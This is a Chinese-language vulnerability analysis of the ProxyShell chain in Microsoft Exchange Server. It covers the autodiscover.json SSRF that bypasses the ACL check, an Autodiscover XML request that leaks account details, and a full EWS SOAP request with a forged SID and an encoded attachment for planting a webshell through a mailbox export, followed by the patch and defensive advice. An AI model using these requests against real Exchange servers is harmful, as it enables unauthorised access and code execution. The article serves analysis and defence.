> 原文链接: https://www.anquanke.com//post/id/251713 


# Microsoft Exchange Server ProxyShell利用分析


                                阅读量   
                                **26386**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t012dca9289df885e44.jpg)](https://p1.ssl.qhimg.com/t012dca9289df885e44.jpg)



## 0x01前言

近日，有研究员公布了自己针对微软的Exchange服务的攻击链的3种利用方式。微软官方虽然出了补丁，但是出于种种原因还是有较多用户不予理会，导致现在仍然有许多有漏洞的服务暴露在公网中，本文主要在原理上简要分析复现了最近的ProxyShell利用链。

[![](https://p0.ssl.qhimg.com/t01f79829c1bb0f1c1a.png)](https://p0.ssl.qhimg.com/t01f79829c1bb0f1c1a.png)

1.ProxyLogon: The most well-known pre-auth RCE chain

2.ProxyOracle: A plaintext-password recovery attacking chain

3.ProxyShell: The pre-auth RCE chain we demonstrated at Pwn2Own 2021



## 0x02漏洞复现及分析

复现环境：<br>
· Exchange Server 2016 Builder 15.1.1531<br>
受影响版本：<br>
· Exchange Server 2013 Versions &lt; Builder 15.0.1497.012<br>
· Exchange Server 2016 CU18 &lt; Builder 15.1.2106.013<br>
· Exchange Server 2016 CU19 &lt; Builder 15.1.2176.009<br>
· Exchange Server 2019 CU7 &lt; Builder 15.2.0721.013

利用链大致分两个阶段，ACL绕过和在绕过前提下的wsdl的SOAP接口利用，最终能导致RCE，利用效果图如下：

[![](https://p3.ssl.qhimg.com/t01a428228206ac3e75.png)](https://p3.ssl.qhimg.com/t01a428228206ac3e75.png)

### <a class="reference-link" name="1.ACL%E7%BB%95%E8%BF%87"></a>1.ACL绕过

在ProxyLogon就存在SSRF，而ProxyShell的SSRF利用点稍有不同，但是利用原理还是一致的，在Exchange 端挂调试下断点，调试dll代码如下，可知URL前后解析方式如下:

[![](https://p0.ssl.qhimg.com/t01c0af0d5d0bc67ecd.png)](https://p0.ssl.qhimg.com/t01c0af0d5d0bc67ecd.png)

解析前URL

[![](https://p1.ssl.qhimg.com/t0170becbacd6e270eb.png)](https://p1.ssl.qhimg.com/t0170becbacd6e270eb.png)

解析后URL

```
https://Exchange:443/autodiscover/autodiscover.json?a=axx@foo.com/autodiscover/autodiscover.xml

↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
https://Exhcage:444/autodiscove/autodiscover.xml
```

从结果看443端口转向 444端口，那么现在再去看在服务端Exchange的web站点分布情况，页面是跑在IIS组件上的，故而看IIS上的站点分布，存在前台服务和后台服务，即存在80到81、443到444的映射关系。

[![](https://p1.ssl.qhimg.com/t01cc8b0c546070f865.png)](https://p1.ssl.qhimg.com/t01cc8b0c546070f865.png)

前台服务

[![](https://p5.ssl.qhimg.com/t01310db2d2c3e61a40.png)](https://p5.ssl.qhimg.com/t01310db2d2c3e61a40.png)

后台服务<br>
现在看利用的本质就是在前台服务中存在校验缺失，导致外面发起的请求可以以前台服务的进程作为跳板进行后台服务资源的访问。

[![](https://p0.ssl.qhimg.com/t01f3dabc404b3bc5b7.png)](https://p0.ssl.qhimg.com/t01f3dabc404b3bc5b7.png)

从代码上看<br>
Microsoft.Exchange.FrontEndHttpProxy.dll

[![](https://p5.ssl.qhimg.com/t01747219377c6f54c9.png)](https://p5.ssl.qhimg.com/t01747219377c6f54c9.png)

[![](https://p5.ssl.qhimg.com/t014cbde6f528b161b0.png)](https://p5.ssl.qhimg.com/t014cbde6f528b161b0.png)

[![](https://p0.ssl.qhimg.com/t01ba1999e114dddb4b.png)](https://p0.ssl.qhimg.com/t01ba1999e114dddb4b.png)

伪代码如下

```
GetClientUrlForProxy()`{`
    If(isExplicitLogoRequest&amp;&amp;IsAutodiscoverV2Request(base.url))
RemoveExplicitLogoFromUrlAbsoluteUri(AbsoluteUri,ExplicitLogoaddress)
`}`
存在3个函数
1. GetClientUrlForProxy
2. isExplicitLogoRequest
3. IsAutodiscoverV2Request
IsAutodiscoverV2Request是关键点，如上图所示，在于/autodiscover.json，如果IsAutodiscoverV2Request存在就可导致URL删除中间部分生成新的uri从而产生了如下解析，导致了SSRF
```

### <a class="reference-link" name="2.%E6%8E%A5%E5%8F%A3%E5%88%A9%E7%94%A8"></a>2.接口利用

Exchange的安装目录如下，可见软件自身就设计了有较多的接口用于业务需求，攻击方式正是基于如上解析方式进行ACL权限绕过，访问铭感资源(想起几年前的某酒店因为wsdl接口外露，被人发现可直接写文件的接口直接RCE的情况)，对于接口的利用在于wsdl的SOAP XML请求的参数要求及报文格式，利用得当的情况下，可在未授权情况下获取配置信息(LegacyDN、SID、邮箱账户)、读写文件、命令交互等。

[![](https://p5.ssl.qhimg.com/t01a1fdba55b503c196.png)](https://p5.ssl.qhimg.com/t01a1fdba55b503c196.png)

接口利用截图

[![](https://p3.ssl.qhimg.com/t01bebe175d851c0481.png)](https://p3.ssl.qhimg.com/t01bebe175d851c0481.png)

以获取LegacyDN信息为例<br>
向/autodiscover/autodiscover.json?a=[foo@foo.com](mailto:foo@foo.com)/autodiscover/autodiscover.xml发送如下xml请求可返回LegacyDN内容

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;Autodiscover xmlns="https://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"&gt;
  &lt;Request&gt;
    &lt;EMailAddress&gt;mara@contoso.com&lt;/EMailAddress&gt;
    &lt;AcceptableResponseSchema&gt;https://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;
  &lt;/Request&gt;
&lt;/Autodiscover&gt;
```

而里面所需的EMailAddress参数如果未知，可使用官方包含的默认特殊系统邮箱。

[![](https://p3.ssl.qhimg.com/t0147f6b89467eaa4c9.png)](https://p3.ssl.qhimg.com/t0147f6b89467eaa4c9.png)

xml格式官方文档连接如下<br>[https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-get-user-settings-from-exchange-by-using-autodiscover](https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-get-user-settings-from-exchange-by-using-autodiscover)

[![](https://p1.ssl.qhimg.com/t015bd87e2b647bdc63.png)](https://p1.ssl.qhimg.com/t015bd87e2b647bdc63.png)

其他接口对应的请求测试如下所示<br>
获取SID

[![](https://p5.ssl.qhimg.com/t0147a5f3ad28bc0310.png)](https://p5.ssl.qhimg.com/t0147a5f3ad28bc0310.png)

获取邮箱

[![](https://p4.ssl.qhimg.com/t01144d1f35aa9afc5f.png)](https://p4.ssl.qhimg.com/t01144d1f35aa9afc5f.png)

写入文件

[![](https://p5.ssl.qhimg.com/t01d6b5905cb26b21d1.png)](https://p5.ssl.qhimg.com/t01d6b5905cb26b21d1.png)

[![](https://p0.ssl.qhimg.com/t0168554bafdc143415.png)](https://p0.ssl.qhimg.com/t0168554bafdc143415.png)

[![](https://p5.ssl.qhimg.com/t0155d2a84a204defef.png)](https://p5.ssl.qhimg.com/t0155d2a84a204defef.png)

实现写入文件的思路大致为调用邮件接口发送邮件，在调用导出邮件接口，向指定系统路径(iis根目录)写入webshell。由于邮件内容为PST格式，IIS解析不了，需要二次解码，即发送之前先编码一次，导出的时候在解码成正常格式即可，<br>
编码方式官方文档链接如下([https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd)。](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd)%E3%80%82)

[![](https://p3.ssl.qhimg.com/t018701039329158e33.png)](https://p3.ssl.qhimg.com/t018701039329158e33.png)

在写入文件的时候还需要构造cookie才能进行调用访问，如果没有cookie会返回401，所幸构造的所需要的内容可以通过SSRF获取，然后在分析调试代码在手工构造，发送邮件然后导出邮件。

```
&lt;soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
  &lt;soap:Header&gt;
    &lt;t:RequestServerVersion Version="Exchange2016" /&gt;
    &lt;t:SerializedSecurityContext&gt;
      &lt;t:UserSid&gt;
      S-1-5-21-1692751536-334164737-1685896678-16656
      &lt;/t:UserSid&gt;
      &lt;t:GroupSids&gt;
        &lt;t:GroupIdentifier&gt;
          &lt;t:SecurityIdentifier&gt;
          S-1-5-21
          &lt;/t:SecurityIdentifier&gt;
        &lt;/t:GroupIdentifier&gt;
      &lt;/t:GroupSids&gt;
    &lt;/t:SerializedSecurityContext&gt;
  &lt;/soap:Header&gt;
  &lt;soap:Body&gt;
    &lt;m:CreateItem MessageDisposition="SaveOnly"&gt;
      &lt;m:Items&gt;
        &lt;t:Message&gt;
          &lt;t:Subject&gt;tsjsupqgmdciximd&lt;/t:Subject&gt;
          &lt;t:Body BodyType="HTML"&gt;hello by xyy&lt;/t:Body&gt;
          &lt;t:Attachments&gt;
            &lt;t:FileAttachment&gt;
              &lt;t:Name&gt;f.txt&lt;/t:Name&gt;
              &lt;t:IsInline&gt;false&lt;/t:IsInline&gt;
              &lt;t:IsContactPhoto&gt;false&lt;/t:IsContactPhoto&gt;
              &lt;t:Content&gt;
              ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoLZnl33BlQUt9MGObmp39opINOpDYzJ6Z45OTk52qWpzYy+2lz32tYUfoLaddpUKVTTDdqCD2uC9wbWqV3agskxvtrWadMG1trzRAYNMZ45OTk5IZ6V+9ZUhrdpFNk=
              &lt;/t:Content&gt;
            &lt;/t:FileAttachment&gt;
          &lt;/t:Attachments&gt;
          &lt;t:ToRecipients&gt;
            &lt;t:Mailbox&gt;
              &lt;t:EmailAddress&gt;
             administartor@tamail.com
              &lt;/t:EmailAddress&gt;
            &lt;/t:Mailbox&gt;
          &lt;/t:ToRecipients&gt;
        &lt;/t:Message&gt;
      &lt;/m:Items&gt;
    &lt;/m:CreateItem&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;
```

调试代码如下：<br>
Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule.dll<br>
序列化解密X-Rps-CAT数值的代码如下

[![](https://p4.ssl.qhimg.com/t0136690a0998c5e8d5.png)](https://p4.ssl.qhimg.com/t0136690a0998c5e8d5.png)

[![](https://p0.ssl.qhimg.com/t01cc7c06872f03172a.png)](https://p0.ssl.qhimg.com/t01cc7c06872f03172a.png)

[![](https://p3.ssl.qhimg.com/t019c7b819bd109aad8.png)](https://p3.ssl.qhimg.com/t019c7b819bd109aad8.png)

[![](https://p3.ssl.qhimg.com/t01e16366aa2d0ac87b.png)](https://p3.ssl.qhimg.com/t01e16366aa2d0ac87b.png)

[![](https://p5.ssl.qhimg.com/t01bf5ef84a612c2a33.png)](https://p5.ssl.qhimg.com/t01bf5ef84a612c2a33.png)

[![](https://p3.ssl.qhimg.com/t01faff85d05b806f9c.png)](https://p3.ssl.qhimg.com/t01faff85d05b806f9c.png)



## 0x03修复原理

修复前

[![](https://p4.ssl.qhimg.com/t0146356ab447d5088a.png)](https://p4.ssl.qhimg.com/t0146356ab447d5088a.png)

修复后

[![](https://p1.ssl.qhimg.com/t011df4a92979087f19.png)](https://p1.ssl.qhimg.com/t011df4a92979087f19.png)

可以明显看出删除了IsAutodiscoverV2Request判断防止SSRF的发生。



## 0x04总结

SSRF漏洞看似危害不大，但是只要后续攻击链够完整，一样能发挥关键作用，就像这次的绕过加利用，又或是之前看过SSRF到内网漫游的利用。从流量防御的角度来看(毕竟官方的补丁也不是那么及时)，找准利用的入口点(autodiscover.json)以及其他能造成危害的接口(/ews、/ecp、/autodiscover、/powershell等等)设置相应的防御手段即可。从漏洞挖掘的角度来看，动态调试永远是清晰体现流量的生命周期的一个不错的方式。

链接:<br>[https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf)<br>[https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1](https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1)
